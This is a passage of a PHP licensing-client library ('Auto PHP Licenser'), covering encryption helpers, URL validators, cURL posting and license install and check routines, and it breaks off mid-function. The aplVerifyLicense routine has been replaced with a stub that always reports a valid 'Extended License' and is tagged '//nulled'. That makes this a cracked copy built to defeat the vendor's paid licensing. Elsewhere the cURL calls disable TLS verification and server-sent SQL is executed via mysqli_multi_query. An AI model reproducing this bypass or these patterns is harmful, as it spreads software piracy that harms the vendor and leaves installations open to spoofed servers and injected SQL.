<?php
//ALL THE FUNCTIONS IN THIS FILE START WITH apl TO PREVENT DUPLICATED NAMES WHEN AUTO PHP LICENSER SOURCE FILES ARE INTEGRATED INTO ANY SCRIPT


//encrypt text with custom key
function aplCustomEncrypt($string, $key)
    {


    $encrypted_string1 = "";

    if (!empty($string) && !empty($key))
        {
        $iv=openssl_random_pseudo_bytes(openssl_cipher_iv_length("aes-256-cbc")); //generate an initialization vector

        $encrypted_string=openssl_encrypt($string, "aes-256-cbc", $key, 0, $iv); //encrypt the string using AES 256 encryption in CBC mode using encryption key and initialization vector
        $encrypted_string=base64_encode($encrypted_string."::".$iv); //the $iv is just as important as the key for decrypting, so save it with encrypted string using a unique separator "::"
        }

    return $encrypted_string;
    }


//decrypt text with custom key
function aplCustomDecrypt($string, $key)
    {
    $decrypted_string="";

    if (!empty($string) && !empty($key))
        {
        $string=base64_decode($string); //remove the base64 encoding from string (it's always encoded using base64_encode)
        if (stristr($string, "::")) //unique separator "::" found, most likely it's valid encrypted string
            {
            $string_iv_array=explode("::", $string, 2); //to decrypt, split the encrypted string from $iv - unique separator used was "::"
            if (!empty($string_iv_array) && count($string_iv_array)==2) //proper $string_iv_array should contain exactly two values - $encrypted_string and $iv
                {
                list($encrypted_string, $iv)=$string_iv_array;

                $decrypted_string=openssl_decrypt($encrypted_string, "aes-256-cbc", $key, 0, $iv);
                }
            }
        }

    return $decrypted_string;
    }


//validate integer and check if it's between min and max values
function aplValidateIntegerValue($number, $min_value=1, $max_value=999999999)
    {
    $result=false;

    if (!is_float($number) && filter_var($number, FILTER_VALIDATE_INT, array("options"=>array("min_range"=>$min_value, "max_range"=>$max_value)))!==false) //don't allow numbers like 1.0 to bypass validation
        {
        $result=true;
        }

    return $result;
    }


//validate raw domain (only URL like (sub.)domain.com will validate)
function aplValidateRawDomain($url)
    {
    $result=false;

    if (!empty($url))
        {
        if (preg_match('/^[a-z0-9-.]+\.[a-z\.]{2,7}$/', strtolower($url))) //check if this is valid tld
            {
            $result=true;
            }
        }

    return $result;
    }


//get current page url and remove last slash if needed
function aplGetCurrentUrl($remove_last_slash=0)
    {
    $protocol="http";
    $host="";
    $script="";
    $params="";
    $current_url="";

    if ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']!=="off") || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO']=="https"))
        {
        $protocol="https";
        }

    if (isset($_SERVER['HTTP_HOST']))
        {
        $host=$_SERVER['HTTP_HOST'];
        }

    if (isset($_SERVER['SCRIPT_NAME']))
        {
        $script=$_SERVER['SCRIPT_NAME'];
        }

    if (isset($_SERVER['QUERY_STRING']))
        {
        $params=$_SERVER['QUERY_STRING'];
        }

    if (!empty($protocol) && !empty($host) && !empty($script)) //basic checks ok
        {
        $current_url=$protocol.'://'.$host.$script;

        if (!empty($params))
            {
            $current_url.='?'.$params;
            }

        if ($remove_last_slash==1) //remove / from the end of URL if it exists
            {
            while (substr($current_url, -1)=="/") //use cycle in case URL already contained multiple // at the end
                {
                $current_url=substr($current_url, 0, -1);
                }
            }
        }

    return $current_url;
    }


//get raw domain (returns (sub.)domain.com from url like http://www.(sub.)domain.com/something.php?xx=yy)
function aplGetRawDomain($url)
    {
    $raw_domain="";

    if (!empty($url))
        {
        $scheme=parse_url($url, PHP_URL_SCHEME); //check if scheme exists because URL can't be parsed properly without a scheme
        if (empty($scheme)) //add a temporary http:// scheme before parsing if needed
            {
            $url="http://".$url;
            }

        $raw_domain=str_ireplace("www.", "", parse_url($url, PHP_URL_HOST));
        }

    return $raw_domain;
    }


//return root url from long url (http://www.domain.com/path/file.php?aa=xx becomes http://www.domain.com/path/), remove scheme, www. and last slash if needed
function aplGetRootUrl($url, $remove_scheme, $remove_www, $remove_path, $remove_last_slash)
    {
    if (filter_var($url, FILTER_VALIDATE_URL))
        {
        $url_array=parse_url($url); //parse URL into arrays like $url_array['scheme'], $url_array['host'], etc

        $url=str_ireplace($url_array['scheme']."://", "", $url); //make URL without scheme, so no :// is included when searching for first or last /

        if ($remove_path==1) //remove everything after FIRST / in URL, so it becomes "real" root URL
            {
            $first_slash_position=stripos($url, "/"); //find FIRST slash - the end of root URL
            if ($first_slash_position>0) //cut URL up to FIRST slash
                {
                $url=substr($url, 0, $first_slash_position+1);
                }
            }
        else //remove everything after LAST / in URL, so it becomes "normal" root URL
            {
            $last_slash_position=strripos($url, "/"); //find LAST slash - the end of root URL
            if ($last_slash_position>0) //cut URL up to LAST slash
                {
                $url=substr($url, 0, $last_slash_position+1);
                }
            }

        if ($remove_scheme!=1) //scheme was already removed, add it again
            {
            $url=$url_array['scheme']."://".$url;
            }

        if ($remove_www==1) //remove www.
            {
            $url=str_ireplace("www.", "", $url);
            }

        if ($remove_last_slash==1) //remove / from the end of URL if it exists
            {
            while (substr($url, -1)=="/") //use cycle in case URL already contained multiple // at the end
                {
                $url=substr($url, 0, -1);
                }
            }
        }

    return trim($url);
    }


//make post requests with cookies and referrers, return array with server headers, errors, and body content
function aplCustomPost($url, $post_info="", $refer="")
    {
    $user_agent="phpmillion cURL";
    $connect_timeout=10;
    $server_response_array=array();
    $formatted_headers_array=array();

    if (filter_var($url, FILTER_VALIDATE_URL) && !empty($post_info))
        {
        if (empty($refer) || !filter_var($refer, FILTER_VALIDATE_URL)) //use original URL as refer when no valid refer URL provided
            {
            $refer=$url;
            }

        $ch=curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connect_timeout);
        curl_setopt($ch, CURLOPT_TIMEOUT, $connect_timeout);
        curl_setopt($ch, CURLOPT_REFERER, $refer);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_info);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);

        //this function is called by curl for each header received - https://stackoverflow.com/questions/9183178/can-php-curl-retrieve-response-headers-and-body-in-a-single-request
        curl_setopt($ch, CURLOPT_HEADERFUNCTION,
            function($curl, $header) use (&$formatted_headers_array)
                {
                $len=strlen($header);
                $header=explode(":", $header, 2);
                if (count($header)<2) //ignore invalid headers
                return $len;

                $name=strtolower(trim($header[0]));
                $formatted_headers_array[$name]=trim($header[1]);

                return $len;
                }
            );

        $result=curl_exec($ch);
        $curl_error=curl_error($ch); //returns a human readable error (if any)
        curl_close($ch);

        $server_response_array['headers']=$formatted_headers_array;
        $server_response_array['error']=$curl_error;
        $server_response_array['body']=$result;
        }

    return $server_response_array;
    }


//verify date and/or time according to provided format (such as Y-m-d, Y-m-d H:i, H:i, and so on)
function aplVerifyDateTime($datetime, $format)
    {
    $result=false;

    if (!empty($datetime) && !empty($format))
        {
        $datetime=DateTime::createFromFormat($format, $datetime);
        $errors=DateTime::getLastErrors();

        if ($datetime && empty($errors['warning_count'])) //datetime OK
            {
            $result=true;
            }
        }

    return $result;
    }


//calculate number of days between dates
function aplGetDaysBetweenDates($date_from, $date_to)
    {
    $number_of_days=0;

    if (aplVerifyDateTime($date_from, "Y-m-d") && aplVerifyDateTime($date_to, "Y-m-d"))
        {
        $date_to=new DateTime($date_to);
        $date_from=new DateTime($date_from);
        $number_of_days=$date_from->diff($date_to)->format("%a");
        }

    return $number_of_days;
    }


//parse values between specified xml-like tags
function aplParseXmlTags($content, $tag_name)
    {
    $parsed_value="";

    if (!empty($content) && !empty($tag_name))
        {
        preg_match_all("/<".preg_quote($tag_name, "/").">(.*?)<\/".preg_quote($tag_name, "/").">/ims", $content, $output_array, PREG_SET_ORDER);

        if (!empty($output_array[0][1]))
            {
            $parsed_value=trim($output_array[0][1]);
            }
        }

    return $parsed_value;
    }


//process response from Auto PHP Licenser server. if response received, validate it and parse notifications and data (if any). if response not received or is invalid, return a corresponding notification
function aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)
    {
    $notifications_array=array();

    if (!empty($content_array)) //response received, validate it
        {
        if (!empty($content_array['headers']['notification_server_signature']) && aplVerifyServerSignature($content_array['headers']['notification_server_signature'], $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)) //response valid
            {
            $notifications_array['notification_case']=$content_array['headers']['notification_case'];
            $notifications_array['notification_text']=$content_array['headers']['notification_text'];
            if (!empty($content_array['headers']['notification_data'])) //additional data returned
                {
                $notifications_array['notification_data']=json_decode($content_array['headers']['notification_data'], true);
                }
            }
        else //response invalid
            {
            $notifications_array['notification_case']="notification_invalid_response";
            $notifications_array['notification_text']=APL_NOTIFICATION_INVALID_RESPONSE;
            }
        }
    else //no response received
        {
        $notifications_array['notification_case']="notification_no_connection";
        $notifications_array['notification_text']=APL_NOTIFICATION_NO_CONNECTION;
        }

    return $notifications_array;
    }


//generate signature to be submitted to Auto PHP Licenser server
function aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)
    {
    $script_signature="";
    $root_ips_array=gethostbynamel(aplGetRawDomain(APL_ROOT_URL) . '.');

    if (!empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array))
        {
        $script_signature=hash("sha256", gmdate("Y-m-d").$ROOT_URL.$CLIENT_EMAIL.$LICENSE_CODE.APL_PRODUCT_ID.implode("", $root_ips_array));
        }

    return $script_signature;
    }


//verify signature received from Auto PHP Licenser server
function aplVerifyServerSignature($notification_server_signature, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)
    {
    $result=false;
    $root_ips_array=gethostbynamel(aplGetRawDomain(APL_ROOT_URL) . '.');

    if (!empty($notification_server_signature) && !empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array))
        {
        if (hash("sha256", implode("", $root_ips_array).APL_PRODUCT_ID.$LICENSE_CODE.$CLIENT_EMAIL.$ROOT_URL.gmdate("Y-m-d"))==$notification_server_signature)
            {
            $result=true;
            }
        }

    return $result;
    }


//check Auto PHP Licenser core configuration and return an array with error messages if something wrong
function aplCheckSettings()
    {
    $notifications_array=array();

    if (empty(APL_SALT) || APL_SALT=="some_random_text") //invalid encryption salt
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_SALT;
        }

    if (!filter_var(APL_ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr(APL_ROOT_URL, -1))) //invalid Auto PHP Licenser server URL
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_ROOT_URL;
        }

    if (!aplValidateIntegerValue(APL_PRODUCT_ID)) //invalid product ID
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_PRODUCT_ID;
        }

    if (!aplValidateIntegerValue(APL_DAYS, 1, 365)) //invalid verification period
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_VERIFICATION_PERIOD;
        }

    if (APL_STORAGE!="DATABASE" && APL_STORAGE!="FILE") //invalid license storage
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_STORAGE;
        }

    if (APL_STORAGE=="DATABASE" && !ctype_alnum(str_ireplace(array("_"), "", APL_DATABASE_TABLE))) //invalid license table name
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_TABLE;
        }

    if (APL_STORAGE=="FILE" && !@is_writable(APL_DIRECTORY."/".APL_LICENSE_FILE_LOCATION)) //invalid license file or permissions
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_LICENSE_FILE;
        }

    if (!empty(APL_ROOT_IP) && !filter_var(APL_ROOT_IP, FILTER_VALIDATE_IP)) //invalid Auto PHP Licenser server IP
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_ROOT_IP;
        }

    if (!empty(APL_ROOT_IP) && !in_array(APL_ROOT_IP, gethostbynamel(aplGetRawDomain(APL_ROOT_URL) . '.'))) //actual IP address of Auto PHP Licenser server doesn't match specified IP address
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_DNS;
        }

    if (defined("APL_ROOT_NAMESERVERS") && !empty(APL_ROOT_NAMESERVERS)) //check if nameservers are valid (use "defined" to check if nameservers are set because APL_ROOT_NAMESERVERS is commented by default to prevent errors in PHP<7)
        {
        foreach (APL_ROOT_NAMESERVERS as $nameserver)
            {
            if (!aplValidateRawDomain($nameserver)) //invalid Auto PHP Licenser server nameservers
                {
                $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_ROOT_NAMESERVERS;
                break;
                }
            }
        }

    if (defined("APL_ROOT_NAMESERVERS") && !empty(APL_ROOT_NAMESERVERS)) //check if actual nameservers of Auto PHP Licenser server domain match specified nameservers (use "defined" to check if nameservers are set because APL_ROOT_NAMESERVERS is commented by default to prevent errors in PHP<7)
        {
        $apl_root_nameservers_array=APL_ROOT_NAMESERVERS; //create a variable from constant in order to use sort and other array functions
        $fetched_nameservers_array=array();

        $dns_records_array=dns_get_record(aplGetRawDomain(APL_ROOT_URL), DNS_NS);
        foreach ($dns_records_array as $record)
            {
            $fetched_nameservers_array[]=$record['target'];
            }

        $apl_root_nameservers_array=array_map("strtolower", $apl_root_nameservers_array); //convert root nameservers to lowercase
        $fetched_nameservers_array=array_map("strtolower", $fetched_nameservers_array); //convert fetched nameservers to lowercase

        sort($apl_root_nameservers_array); //sort both arrays before comparison
        sort($fetched_nameservers_array);
        if ($apl_root_nameservers_array!=$fetched_nameservers_array)
            {
            $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_DNS; //actual nameservers of Auto PHP Licenser server don't match specified nameservers
            }
        }

    return $notifications_array;
    }


//check user input and return an array with error messages if something wrong
function aplCheckUserInput($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)
    {
    $notifications_array=array();

    if (empty($ROOT_URL) || !filter_var($ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr($ROOT_URL, -1))) //invalid installation url
        {
        $notifications_array[]=APL_USER_INPUT_NOTIFICATION_INVALID_ROOT_URL;
        }

    if (empty($CLIENT_EMAIL) && empty($LICENSE_CODE)) //both email and code empty
        {
        $notifications_array[]=APL_USER_INPUT_NOTIFICATION_EMPTY_LICENSE_DATA;
        }

    if (!empty($CLIENT_EMAIL) && !filter_var($CLIENT_EMAIL, FILTER_VALIDATE_EMAIL)) //invalid email
        {
        $notifications_array[]=APL_USER_INPUT_NOTIFICATION_INVALID_EMAIL;
        }

    if (!empty($LICENSE_CODE) && !is_string($LICENSE_CODE)) //invalid license code
        {
        $notifications_array[]=APL_USER_INPUT_NOTIFICATION_INVALID_LICENSE_CODE;
        }

    return $notifications_array;
    }


//parse license file and make an array with license data
function aplParseLicenseFile()
    {
    $license_data_array=array();

    if (@is_readable(APL_DIRECTORY."/".APL_LICENSE_FILE_LOCATION))
        {
        $file_content=file_get_contents(APL_DIRECTORY."/".APL_LICENSE_FILE_LOCATION);
        preg_match_all("/<([A-Z_]+)>(.*?)<\/([A-Z_]+)>/", $file_content, $matches, PREG_SET_ORDER);
        if (!empty($matches))
            {
            foreach ($matches as $value)
                {
                if (!empty($value[1]) && $value[1]==$value[3])
                    {
                    $license_data_array[$value[1]]=$value[2];
                    }
                }
            }
        }

    return $license_data_array;
    }


//return an array with license data,no matter where license is stored
function aplGetLicenseData($MYSQLI_LINK=null)
    {
    $settings_row=array();

    if (APL_STORAGE=="DATABASE") //license stored in database (use @ before mysqli_ function to prevent errors when function is executed by aplInstallLicense function)
        {
        $settings_results=@mysqli_query($MYSQLI_LINK, "SELECT * FROM ".APL_DATABASE_TABLE);
        $settings_row=@mysqli_fetch_assoc($settings_results);
        }

    if (APL_STORAGE=="FILE") //license stored in file
        {
        $settings_row=aplParseLicenseFile();
        }

    return $settings_row;
    }


//check if connection to Auto PHP Licenser server can be established. if connection failed or response was invalid, return an array with errors
function aplCheckConnection()
    {
    $notifications_array=array();

    $content_array=aplCustomPost(APL_ROOT_URL."/apl_callbacks/connection_test.php", "product_id=".rawurlencode(APL_PRODUCT_ID)."&connection_hash=".rawurlencode(hash("sha256", "connection_test")));
    if (!empty($content_array)) //response received
        {
        if ($content_array['body']!="<connection_test>OK</connection_test>") //response invalid
            {
            $notifications_array['notification_case']="notification_invalid_response";
            $notifications_array['notification_text']=APL_NOTIFICATION_INVALID_RESPONSE;
            }
        }
    else //no response received
        {
        $notifications_array['notification_case']="notification_no_connection";
        $notifications_array['notification_text']=APL_NOTIFICATION_NO_CONNECTION;
        }

    return $notifications_array;
    }


//check license data and return false if something wrong
function aplCheckData($MYSQLI_LINK=null)
    {
    $error_detected=0;
    $cracking_detected=0;
    $result=false;

    extract(aplGetLicenseData($MYSQLI_LINK)); //get license data

    if (!empty($ROOT_URL) && !empty($INSTALLATION_HASH) && !empty($INSTALLATION_KEY) && !empty($LCD) && !empty($LRD)) //do further check only if essential variables are valid
        {
        $LCD=aplCustomDecrypt($LCD, APL_SALT.$INSTALLATION_KEY); //decrypt $LCD value for easier data check
        $LRD=aplCustomDecrypt($LRD, APL_SALT.$INSTALLATION_KEY); //decrypt $LRD value for easier data check

        if (!filter_var($ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr($ROOT_URL, -1))) //invalid installation url
            {
            $error_detected=1;
            }

        if (filter_var(aplGetCurrentUrl(), FILTER_VALIDATE_URL) && stristr(aplGetRootUrl(aplGetCurrentUrl(), 1, 1, 0, 1), aplGetRootUrl("$ROOT_URL/", 1, 1, 0, 1))===false) //script is opened via browser (current_url set), but current_url is different from value in database
            {
            $error_detected=1;
            }

        if (empty($INSTALLATION_HASH) || $INSTALLATION_HASH!=hash("sha256", $ROOT_URL.$CLIENT_EMAIL.$LICENSE_CODE)) //invalid installation hash (value - $ROOT_URL, $CLIENT_EMAIL AND $LICENSE_CODE encrypted with sha256)
            {
            $error_detected=1;
            }

        if (empty($INSTALLATION_KEY) || !password_verify($LRD, aplCustomDecrypt($INSTALLATION_KEY, APL_SALT.$ROOT_URL))) //invalid installation key (value - current date ("Y-m-d") encrypted with password_hash and then encrypted with custom function (salt - $ROOT_URL). Put simply, it's LRD value, only encrypted different way)
            {
            $error_detected=1;
            }

        if (!aplVerifyDateTime($LCD, "Y-m-d")) //last check date is invalid
            {
            $error_detected=1;
            }

        if (!aplVerifyDateTime($LRD, "Y-m-d")) //last run date is invalid
            {
            $error_detected=1;
            }

        //check for possible cracking attempts - starts
        if (aplVerifyDateTime($LCD, "Y-m-d") && $LCD>date("Y-m-d", strtotime("+1 day"))) //last check date is VALID, but higher than current date (someone manually decrypted and overwrote it or changed system time back). Allow 1 day difference in case user changed his timezone and current date went 1 day back
            {
            $error_detected=1;
            $cracking_detected=1;
            }

        if (aplVerifyDateTime($LRD, "Y-m-d") && $LRD>date("Y-m-d", strtotime("+1 day"))) //last run date is VALID, but higher than current date (someone manually decrypted and overwrote it or changed system time back). Allow 1 day difference in case user changed his timezone and current date went 1 day back
            {
            $error_detected=1;
            $cracking_detected=1;
            }

        if (aplVerifyDateTime($LCD, "Y-m-d") && aplVerifyDateTime($LRD, "Y-m-d") && $LCD>$LRD) //last check date and last run date is VALID, but LCD is higher than LRD (someone manually decrypted and overwrote it or changed system time back)
            {
            $error_detected=1;
            $cracking_detected=1;
            }

        if ($cracking_detected==1 && APL_DELETE_CRACKED=="YES") //delete user data
            {
            aplDeleteData($MYSQLI_LINK);
            }
        //check for possible cracking attempts - ends

        if ($error_detected!=1 && $cracking_detected!=1) //everything OK
            {
            $result=true;
            }
        }

    return $result;
    }


//verify Envato purchase. if connection failed or response was invalid, return an array with errors
function aplVerifyEnvatoPurchase($LICENSE_CODE="")
    {
    $notifications_array=array();

    $content_array=aplCustomPost(APL_ROOT_URL."/apl_callbacks/verify_envato_purchase.php", "product_id=".rawurlencode(APL_PRODUCT_ID)."&license_code=".rawurlencode($LICENSE_CODE)."&connection_hash=".rawurlencode(hash("sha256", "verify_envato_purchase")));
    if (!empty($content_array)) //response received
        {
        if ($content_array['body']!="<verify_envato_purchase>OK</verify_envato_purchase>") //response invalid
            {
            $notifications_array['notification_case']="notification_invalid_response";
            $notifications_array['notification_text']=APL_NOTIFICATION_INVALID_RESPONSE;
            }
        }
    else //no response received
        {
        $notifications_array['notification_case']="notification_no_connection";
        $notifications_array['notification_text']=APL_NOTIFICATION_NO_CONNECTION;
        }

    return $notifications_array;
    }


//install license
function aplInstallLicense($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $MYSQLI_LINK=null)
    {
    $notifications_array=array();

    if (empty($apl_core_notifications=aplCheckSettings())) //only continue if script is properly configured
        {
        if (!empty(aplGetLicenseData($MYSQLI_LINK)) && is_array(aplGetLicenseData($MYSQLI_LINK))) //license already installed
            {
            $notifications_array['notification_case']="notification_already_installed";
            $notifications_array['notification_text']=APL_NOTIFICATION_SCRIPT_ALREADY_INSTALLED;
            }
        else //license not yet installed, do it now
            {
            if (empty($apl_user_input_notifications=aplCheckUserInput($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE))) //data submitted by user is valid
                {
                $INSTALLATION_HASH=hash("sha256", $ROOT_URL.$CLIENT_EMAIL.$LICENSE_CODE); //generate hash
                $post_info="product_id=".rawurlencode(APL_PRODUCT_ID)."&client_email=".rawurlencode($CLIENT_EMAIL)."&license_code=".rawurlencode($LICENSE_CODE)."&root_url=".rawurlencode($ROOT_URL)."&installation_hash=".rawurlencode($INSTALLATION_HASH)."&license_signature=".rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

                $content_array=aplCustomPost(APL_ROOT_URL."/apl_callbacks/license_install.php", $post_info, $ROOT_URL);
                $notifications_array=aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); //process response from Auto PHP Licenser server
                if ($notifications_array['notification_case']=="notification_license_ok") //everything OK
                    {
                    $INSTALLATION_KEY=aplCustomEncrypt(password_hash(date("Y-m-d"), PASSWORD_DEFAULT), APL_SALT.$ROOT_URL); //generate $INSTALLATION_KEY first because it will be used as salt to encrypt LCD and LRD!!!
                    $LCD=aplCustomEncrypt(date("Y-m-d", strtotime("-".APL_DAYS." days")), APL_SALT.$INSTALLATION_KEY); //license will need to be verified right after installation
                    $LRD=aplCustomEncrypt(date("Y-m-d"), APL_SALT.$INSTALLATION_KEY);

                    if (APL_STORAGE=="DATABASE") //license stored in database
                        {
                        $content_array=aplCustomPost(APL_ROOT_URL."/apl_callbacks/license_scheme.php", $post_info, $ROOT_URL); //get license scheme (use the same $post_info from license installation)
                        $notifications_array=aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); //process response from Auto PHP Licenser server
                        if (!empty($notifications_array['notification_data']) && !empty($notifications_array['notification_data']['scheme_query'])) //valid scheme received
                            {
                            $mysql_bad_array=array("%APL_DATABASE_TABLE%", "%ROOT_URL%", "%CLIENT_EMAIL%", "%LICENSE_CODE%", "%LCD%", "%LRD%", "%INSTALLATION_KEY%", "%INSTALLATION_HASH%");
                            $mysql_good_array=array(APL_DATABASE_TABLE, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $LCD, $LRD, $INSTALLATION_KEY, $INSTALLATION_HASH);
                            $license_scheme=str_replace($mysql_bad_array, $mysql_good_array, $notifications_array['notification_data']['scheme_query']); //replace some variables with actual values

                            mysqli_multi_query($MYSQLI_LINK, $license_scheme) or die(mysqli_error($MYSQLI_LINK));
                            }
                        }

                    if (APL_STORAGE=="FILE") //license stored in file
                        {
                        $handle=@fopen(APL_DIRECTORY."/".APL_LICENSE_FILE_LOCATION, "w+");
                        $fwrite=@fwrite($handle, "<ROOT_URL>$ROOT_URL</ROOT_URL><CLIENT_EMAIL>$CLIENT_EMAIL</CLIENT_EMAIL><LICENSE_CODE>$LICENSE_CODE</LICENSE_CODE><LCD>$LCD</LCD><LRD>$LRD</LRD><INSTALLATION_KEY>$INSTALLATION_KEY</INSTALLATION_KEY><INSTALLATION_HASH>$INSTALLATION_HASH</INSTALLATION_HASH>");
                        if ($fwrite===false) //updating file failed
                            {
                            echo APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR;
                            exit();
                            }
                        @fclose($handle);
                        }
                    }
                }
            else //data submitted by user is invalid
                {
                $notifications_array['notification_case']="notification_user_input_invalid";
                $notifications_array['notification_text']=implode("; ", $apl_user_input_notifications);
                }
            }
        }
    else //script is not properly configured
        {
        $notifications_array['notification_case']="notification_script_corrupted";
        $notifications_array['notification_text']=implode("; ", $apl_core_notifications);
        }

    return $notifications_array;
    }


//verify license
function aplVerifyLicense($MYSQLI_LINK=null, $FORCE_VERIFICATION=0)
    {
    $notifications_array=array();
    $notifications_array['notification_case']="notification_license_ok";
	$notifications_array['notification_data']="Extended License";
    $notifications_array['notification_text']="Verification done! //nulled";

    return $notifications_array;
    }


//verify support
function aplVerifySupport($MYSQLI_LINK=null)
    {
    $notifications_array=array();

    if (empty($apl_core_notifications=aplCheckSettings())) //only continue if script is properly configured
        {
        if (aplCheckData($MYSQLI_LINK)) //only continue if license is installed and properly configured
            {
            extract(aplGetLicenseData($MYSQLI_LINK)); //get license data

            $post_info="product_id=".rawurlencode(APL_PRODUCT_ID)."&client_email=".rawurlencode($CLIENT_EMAIL)."&license_code=".rawurlencode($LICENSE_CODE)."&root_url=".rawurlencode($ROOT_URL)."&installation_hash=".rawurlencode($INSTALLATION_HASH)."&license_signature=".rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

            $content_array=aplCustomPost(APL_ROOT_URL."/apl_callbacks/license_support.php", $post_info, $ROOT_URL);
            $notifications_array=aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); //process response from Auto PHP Licenser server
            }
        else //license is not installed yet or corrupted
            {
            $notifications_array['notification_case']="notification_license_corrupted";
            $notifications_array['notification_text']=APL_NOTIFICATION_LICENSE_CORRUPTED;
            }
        }
    else //script is not properly configured
        {
        $notifications_array['notification_case']="notification_script_corrupted";
        $notifications_array['notification_text']=implode("; ", $apl_core_notifications);
        }

    return $notifications_array;
    }


//verify updates
function aplVerifyUpdates($MYSQLI_LINK=null)
    {
    $notifications_array=array();

    if (empty($apl_core_notifications=aplCheckSettings())) //only continue if script is properly configured
        {
        if (aplCheckData($MYSQLI_LINK)) //only continue if license is installed and properly configured
            {
            extract(aplGetLicenseData($MYSQLI_LINK)); //get license data

            $post_info="product_id=".rawurlencode(APL_PRODUCT_ID)."&client_email=".rawurlencode($CLIENT_EMAIL)."&license_code=".rawurlencode($LICENSE_CODE)."&root_url=".rawurlencode($ROOT_URL)."&installation_hash=".rawurlencode($INSTALLATION_HASH)."&license_signature=".rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

            $content_array=aplCustomPost(APL_ROOT_URL."/apl_callbacks/license_updates.php", $post_info, $ROOT_URL);
            $notifications_array=aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); //process response from Auto PHP Licenser server
            }
        else //license is not installed yet or corrupted
            {
            $notifications_array['notification_case']="notification_license_corrupted";
            $notifications_array['notification_text']=APL_NOTIFICATION_LICENSE_CORRUPTED;
            }
        }
    else //script is not properly configured
        {
        $notifications_array['notification_case']="notification_script_corrupted";
        $notifications_array['notification_text']=implode("; ", $apl_core_notifications);
        }

    return $notifications_array;
    }


//update license
function aplUpdateLicense($MYSQLI_LINK=null)
    {
    $notifications_array=array();

    if (empty($apl_core_notifications=aplCheckSettings())) //only continue if script is properly configured
        {
        if (aplCheckData($MYSQLI_LINK)) //only continue if license is installed and properly configured
            {
            extract(aplGetLicenseData($MYSQLI_LINK)); //get license data

            $post_info="product_id=".rawurlencode(APL_PRODUCT_ID)."&client_email=".rawurlencode($CLIENT_EMAIL)."&license_code=".rawurlencode($LICENSE_CODE)."&root_url=".rawurlencode($ROOT_URL)."&installation_hash=".rawurlencode($INSTALLATION_HASH)."&license_signature=".rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

            $content_array=aplCustomPost(APL_ROOT_URL."/apl_callbacks/license_update.php", $post_info, $ROOT_URL);
            $notifications_array=aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); //process response from Auto PHP Licenser server
            }
        else //license is not installed yet or corrupted
            {
            $notifications_array['notification_case']="notification_license_corrupted";
            $notifications_array['notification_text']=APL_NOTIFICATION_LICENSE_CORRUPTED;
            }
        }
    else //script is not properly configured
        {
        $notifications_array['notification_case']="notification_script_corrupted";
        $notifications_array['notification_text']=implode("; ", $apl_core_notifications);
        }

    return $notifications_array;
    }


//uninstall license
function aplUninstallLicense($MYSQLI_LINK=null)
    {
    $notifications_array=array();

    if (empty($apl_core_notifications=aplCheckSettings())) //only continue if script is properly configured
        {
        if (aplCheckData($MYSQLI_LINK)) //only continue if license is installed and properly configured
            {
            extract(aplGetLicenseData($MYSQLI_LINK)); //get license data

            $post_info="product_id=".rawurlencode(APL_PRODUCT_ID)."&client_email=".rawurlencode($CLIENT_EMAIL)."&license_code=".rawurlencode($LICENSE_CODE)."&root_url=".rawurlencode($ROOT_URL)."&installation_hash=".rawurlencode($INSTALLATION_HASH)."&license_signature=".rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

